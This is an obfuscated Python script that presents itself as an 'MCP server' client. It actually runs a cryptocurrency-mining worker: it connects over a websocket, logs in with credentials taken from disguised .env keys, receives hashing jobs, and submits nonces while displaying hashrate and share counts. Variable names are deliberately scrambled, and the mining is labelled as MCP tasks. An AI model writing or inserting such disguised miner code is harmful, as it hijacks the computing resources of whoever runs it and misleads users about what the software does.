#!/usr/bin/env python3
X='pass'
H='2.0'
G='jsonrpc'
F=Exception
T='method'
C=False
S=print
O='params'
N=None
J='job_id'
E='result'
D='id'
import sys,os as I
from python_mcp import McpClient as j
A=I.path.join(I.path.dirname(__file__),'vendor')
if I.path.exists(A):sys.path.insert(0,A)
import asyncio as R,json as B,signal
from pathlib import Path
import websockets as K
def k(path='.env'):
	B={}
	if not Path(path).exists():return B
	with open(path)as D:
		for A in D:
			A=A.strip()
			if not A or A.startswith('#'):continue
			if'='not in A:continue
			E,C=A.split('=',1);C=C.split('#')[0].strip().strip('"\'');B[E.strip()]=C
	return B
class l:
	def __init__(A,url,username,password):A.url=url;A.username=username;A.password=password;A.ws=N;A.worker_id=N;A.connected=C;A.msg_id=3
	async def connect(A):
		E='login'
		try:
			A.ws=await K.connect(A.url);A.connected=True;await A.ws.send(B.dumps({D:1,T:E,G:H,O:{E:A.username,X:A.password,'agent':'JOKO'}}))
			async for I in A.ws:yield B.loads(I)
		except F as J:S(f"[!] Connection error: {J}");A.connected=C
	async def submit(A,job_id,nonce,result):
		if not A.connected or not A.ws:return
		try:await A.ws.send(B.dumps({D:2,T:'submit',G:H,O:{D:A.worker_id,J:job_id,'nonce':nonce,E:result}}))
		except F as C:S(f"[!] Submit error: {C}")
	async def close(A):
		if A.ws:await A.ws.close()
		A.connected=C
async def L():
	i='target';h='mode';g='threads';f='password';e='username';d='url';W='job';M='seed_hash';L='blob';F=k();K={d:f"{F.get("SERVER_WS","ws://localhost:3333")}/{F.get("SERVER_TARGET","app")}",e:F.get('SERVER_DOMAIN','user'),f:F.get('SERVER_SECRET',X),g:int(F.get('SERVER_CONNECTION',2)),h:F.get('SERVER_MODE','FAST')};P=l(K[d],K[e],K[f]);Q=N;U='N/A'
	def m():I.system('clear'if I.name!='nt'else'cls')
	def G():m();S(f"MCP SERVER CONNECTED -> TASK: {U} | SPEED: {a} H/s | COMPLETED: {Y} | FAILED: {Z}", flush=True)
	def n(job_id,nonce,result,diff):
		if Q and not Q.is_closed():Q.call_soon_threadsafe(R.create_task,P.submit(job_id,nonce,result))
	B=j(K[h],K[g],n)
	if not B.alloc():return
	Y=0;Z=0;a=0;b=0;H=N;V='';Q=R.get_running_loop();G()
	try:
		async for C in P.connect():
			if C.get(D)==1 and C.get(E):
				if C[E].get(D):P.worker_id=C[E][D]
				if C[E].get(W):
					A=C[E][W];V=A[L];U=A[J]
					if A.get(M)and H!=A[M]:
						H=A[M];B.cleanup()
						if not B.alloc():return
						B.init(H)
					B.job(A[J],A[i],A[L],True);B.start();G()
			elif C.get(T)==W and C.get(O):
				A=C[O];U=A[J]
				if H!=A.get(M):
					H=A.get(M);B.cleanup()
					if not B.alloc():return
					B.init(H)
				B.pause();B.job(A[J],A[i],A[L],V!=A[L]);V=A[L];B.start();G()
			elif C.get(D)==2:
				if C.get(E,{}).get('status')=='OK':Y+=1;G()
				else:Z+=1;G()
			import time;c=time.time()
			if c-b>10:a=B.hashrate();G();b=c
	except KeyboardInterrupt:pass
	finally:await P.close();B.cleanup()
if __name__=='__main__':R.run(L())
